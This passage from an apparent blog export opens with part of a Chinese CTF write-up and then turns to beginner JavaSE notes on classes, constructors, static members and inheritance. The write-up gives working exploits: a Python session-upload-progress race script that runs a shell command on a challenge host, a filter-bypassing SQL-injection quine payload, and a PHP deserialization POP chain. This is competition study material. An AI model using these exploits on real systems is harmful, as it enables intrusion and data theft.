<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.115.134.72:32770/&quot;</span></span><br><span class="line">PHPSESSID = <span class="string">&quot;2333&quot;</span></span><br><span class="line">PHP_SESSION_UPLOAD_PROGRESS = <span class="string">&quot;&lt;?php system(&#x27;cat /flag_is_here_not_are_but_you_find&#x27;);?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&quot;a&quot;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: PHP_SESSION_UPLOAD_PROGRESS&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;233.txt&quot;</span>, f)&#125;, cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: PHPSESSID&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rsp = session.get(</span><br><span class="line">            url=<span class="string">f&quot;http://114.115.134.72:32770/?file=/tmp/sess_<span class="subst">&#123;PHPSESSID&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            <span class="built_in">print</span>(rsp.text)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=write, args=(session,))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    exploit(session)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/3694939133.png"></p>
<h3 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alertMes(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>payload：</p>
<p><code>&#39;union/**/select/**/replace(replace(&#39;&quot;union/**/select/**/replace(replace(&quot;X&quot;,char(34),char(39)),char(88),&quot;X&quot;)#&#39;,char(34),char(39)),char(88),&#39;&quot;union/**/select/**/replace(replace(&quot;X&quot;,char(34),char(39)),char(88),&quot;X&quot;)#&#39;)#</code></p>
<h3 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h3><p>本地起了个环境，发现可以泄露出密码直接登录写shell</p>
<p><img src="/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/59208566.png"></p>
<p><img src="/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/418859014.png"></p>
<h3 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>反序列化 pop 链，exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cinder</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__constrict</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nova = &amp;<span class="keyword">$this</span>-&gt;neutron;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ace();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;docker = serialize(<span class="keyword">new</span> acp());</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> acp();</span><br><span class="line"><span class="variable">$b</span>-&gt;cinder = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>比赛WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>Web</tag>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之面向对象</title>
    <url>/2021/12/07/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（一）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="面向对象概述"><a href="#面向对象概述" class="headerlink" title="面向对象概述"></a>面向对象概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>面向对象编程就是就是拿或找东西过来编程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;    </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1、创建一个扫描器对象，用于接收用户输入的数据</span></span><br><span class="line">    System.out.println(<span class="string">&quot;请您输入您的年龄：&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> age = sc.nextInt();</span><br><span class="line">    System.out.println(age);</span><br><span class="line">    <span class="comment">// 2、得到一个随机数对象，用于得到随机数       </span></span><br><span class="line">    <span class="keyword">int</span> data = r.nextInt(<span class="number">10</span>) + <span class="number">1</span> ; <span class="comment">// 生成 1-10之间的随机数</span></span><br><span class="line">    System.out.println(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="定义类的注意事项"><a href="#定义类的注意事项" class="headerlink" title="定义类的注意事项"></a>定义类的注意事项</h5><ul>
<li>类名首字母大写，满足驼峰模式</li>
<li>一个 Java 文件可以定义多个类，但只有一个类可以被 public 修饰，且该类必须成为文件名称</li>
<li>一般建议一个 Java 文件只定义一个类</li>
</ul>
<h5 id="类的成分"><a href="#类的成分" class="headerlink" title="类的成分"></a>类的成分</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">  <span class="comment">// 1、成员变量</span></span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="comment">// 2、构造器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="comment">// 3、方法</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="comment">// 4、代码块</span></span><br><span class="line">  <span class="keyword">static</span>&#123;&#125;</span><br><span class="line">  <span class="comment">// 5、内部类</span></span><br><span class="line">  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Heart</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>初始化类的对象并返回对象的地址</li>
</ul>
<h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><ul>
<li><p>构造器格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 类名（形参列表）&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>初始化对象格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">类名 对象变量 = <span class="keyword">new</span> 构造器;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="分类和作用"><a href="#分类和作用" class="headerlink" title="分类和作用"></a>分类和作用</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 成员变量</span></span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">  <span class="comment">// 1、无参数构造器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 2、有参数构造器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// getter + setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>任何类定义出来，默认自带无参构造器，写不写都存在</li>
<li>一旦定义有参构造器，无参构造器就消失了，此时就需要自定义无参构造器</li>
</ul>
<h4 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>作用：出现在成员方法中、构造器中，代表当前对象的地址，用于指定访问<strong>当前对象</strong>的成员变量、成员方法</li>
<li>this 出现在构造器或者方法中，哪个对象调用它，this 就代表哪个对象</li>
</ul>
<h4 id="面向对象三特征之一：封装"><a href="#面向对象三特征之一：封装" class="headerlink" title="面向对象三特征之一：封装"></a>面向对象三特征之一：封装</h4><h5 id="认识一下嘛-3"><a href="#认识一下嘛-3" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>基本思想：解决属性和方法属于哪个对象的问题</li>
<li>步骤：通常是将成员变量私有，然后提供方法去合理暴露</li>
<li>作用：提高业务功能设计的安全性，提高程序逻辑性和开发效率</li>
</ul>
<h5 id="标准-JavaBean"><a href="#标准-JavaBean" class="headerlink" title="标准 JavaBean"></a>标准 JavaBean</h5><ul>
<li>可以理解为实体类，其对象可以用于封装数据，符合封装的思想</li>
<li>格式<ul>
<li>成员变量用 private 修饰</li>
<li>提供每一个成员变量对应的 set 和 get 方法</li>
<li>必须提供一个无参构造器</li>
</ul>
</li>
</ul>
<h4 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h4><h5 id="认识一下嘛-4"><a href="#认识一下嘛-4" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>static 是静态的意思，可以修饰成员变量和成员方法</li>
<li>static 修饰表示只在内存中<strong>存储一份</strong>，可以<strong>被共享访问、修改</strong></li>
</ul>
<h5 id="修饰成员变量"><a href="#修饰成员变量" class="headerlink" title="修饰成员变量"></a>修饰成员变量</h5><ul>
<li><p>实例成员变量，无 static 修饰，属于对象，访问格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 实例成员变量</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line">对象.实例成员变量</span><br></pre></td></tr></table></figure></li>
<li><p>静态成员变量，被 static 修饰，共享，访问格式（一般用第一种方式）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 静态成员变量</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String onlineNumber= <span class="number">161</span>;</span><br><span class="line">&#125;</span><br><span class="line">类名.静态成员变量</span><br><span class="line">对象.静态成员变量</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="修饰成员方法"><a href="#修饰成员方法" class="headerlink" title="修饰成员方法"></a>修饰成员方法</h5><ul>
<li><p>实例成员方法，无 static 修饰，属于对象，只能用对象触发访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">  System.out.println(name + <span class="string">&quot;poria&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">对象.实例成员方法</span><br></pre></td></tr></table></figure></li>
<li><p>静态成员方法，被 static 修饰，属于类，建议用类名访问，也可以用对象访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> a , <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line"> &#125;</span><br><span class="line">类名.静态成员方法</span><br><span class="line">对象.静态成员方法</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>静态方法只能访问静态的成员，不可以直接访问实例成员</li>
<li>实例方法可以访问静态的成员，也可以访问实例成员</li>
<li>静态方法中不会出现 this 关键字</li>
</ul>
<h5 id="static-应用实例——工具类"><a href="#static-应用实例——工具类" class="headerlink" title="static 应用实例——工具类"></a>static 应用实例——工具类</h5><ul>
<li>工具类中定义的都是静态方法，调用方便，提高了代码复用（一次编写，处处可用）</li>
<li>注意事项：<ul>
<li>工具类的构造器一般都为私有，无需创建对象</li>
<li>由于工具类中都是静态方法，直接用类名索引访问即可</li>
</ul>
</li>
</ul>
<h5 id="static-应用知识——代码块"><a href="#static-应用知识——代码块" class="headerlink" title="static 应用知识——代码块"></a>static 应用知识——代码块</h5><ul>
<li><p>类的五大成分之一，定义在类中</p>
</li>
<li><p>分类</p>
<ul>
<li><p>静态代码块</p>
<ul>
<li>格式：<code>static&#123;&#125;</code></li>
<li>特点：需要通过 static 关键字修饰，随着类的加载而加载，并且<strong>自动触发、只执行一次</strong></li>
</ul>
</li>
<li><p>构造代码块（很少用到）</p>
<ul>
<li>格式：<code>&#123;&#125;</code></li>
<li>特点：每次创建对象，调用构造器执行时，都会执行该代码块中的代码，并且<strong>在构造器执行前执行</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="static-应用知识——单例设计模式"><a href="#static-应用知识——单例设计模式" class="headerlink" title="static 应用知识——单例设计模式"></a>static 应用知识——单例设计模式</h5><ul>
<li><p>单例模式：</p>
<p>可以保证系统中，应用该模式的这个类永远只有一个实例，即<strong>这个类永远只能创建一个对象</strong></p>
<p>例如任务管理器对象我们只需要一个就可以解决问题了，这样可以节省内存空间</p>
</li>
<li><p>饿汉单例</p>
<ul>
<li><p>在用类获取对象的时候，对象已经提前创建好</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 定义一个单例类 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleInstance</span> </span>&#123;</span><br><span class="line">  <span class="comment">/** 定义一个静态变量存储一个对象即可 :属于类，与类一起加载一次 */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> SingleInstance instance = <span class="keyword">new</span> SingleInstance ();</span><br><span class="line">  <span class="comment">/** 单例必须私有构造器*/</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;创建了对象&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>设计步骤：</p>
<ul>
<li>定义一个类，把构造器私有</li>
<li>定义一个静态变量储存一个对象</li>
</ul>
</li>
</ul>
</li>
<li><p>懒汉单例</p>
<ul>
<li><p>在真正需要对象的时候，才去创建一个对象（延迟加载）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 定义一个单例类 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleInstance</span></span>&#123;</span><br><span class="line">  <span class="comment">/** 定义一个静态变量存储一个对象即可 :属于类，与类一起加载一次 */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> SingleInstance instance ; <span class="comment">// null</span></span><br><span class="line">  <span class="comment">/** 单例必须私有构造器*/</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="comment">/** 必须提供一个方法返回一个单例对象  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleInstance <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> ...;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>设计步骤</p>
<ul>
<li>定义一个类，把构造器私有</li>
<li>定义一个静态变量存储一个对象</li>
<li>提供一个返回单例对象的方法</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="面向对象三特征之二：继承"><a href="#面向对象三特征之二：继承" class="headerlink" title="面向对象三特征之二：继承"></a>面向对象三特征之二：继承</h4><h5 id="认识一下嘛-5"><a href="#认识一下嘛-5" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><p>Java中提供一个关键字extends，用这个关键字，可以让一个类和另一个类建立起父子关系</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">People</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>Student 成为子类（派生类），People 称为父类（基类、超类）</p>
</li>
<li><p>提高了代码复用，减少代码冗余，增强类的功能拓展性</p>
</li>
</ul>
<h5 id="设计规范"><a href="#设计规范" class="headerlink" title="设计规范"></a>设计规范</h5><ul>
<li>子类们的相同特征（共性属性、共性方法）放在父类中定义</li>
<li>子类独有的属性和行为应该定义在自己的类中</li>
</ul>
<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul>
<li>子类可以继承父类的属性（变量）和行为（方法），但是不能继承父类构造器</li>
<li>Java 是单继承模式，一个类只能继承一个父类（不然就乱伦了</li>
<li>Java 支持多层继承</li>
<li>Java 中所有类都是 Object 的子类，Object 是祖宗类</li>
<li>子类是否可以继承父类的私有成员？<ul>
<li>我认为，可以继承，只是不能访问到</li>
</ul>
</li>
<li>子类是否可以继承父类的静态成员和方法？<ul>
<li>我认为，不能继承，虽然子类可以使用父类的静态成员和方法，但是这是 static 的共享特性，共享并非是继承</li>
</ul>
</li>
</ul>
<h5 id="索引访问特点"><a href="#索引访问特点" class="headerlink" title="索引访问特点"></a>索引访问特点</h5><ul>
<li><p>在子类方法中访问成员和方法满足<strong>就近原则</strong>，子类中找不到找父类，父类中找不到就报错（可以类比于 JavaScript 中的原型链）</p>
</li>
<li><p>如果在子父类中出现了重名的成员或方法，而此时一定要在子类中调用父类的成员或方法时，需要用到 super 关键字，指定访问父类的成员或方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">super</span>.父类成员变量</span><br><span class="line"><span class="keyword">super</span>.父类成员方法  </span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h5><ul>
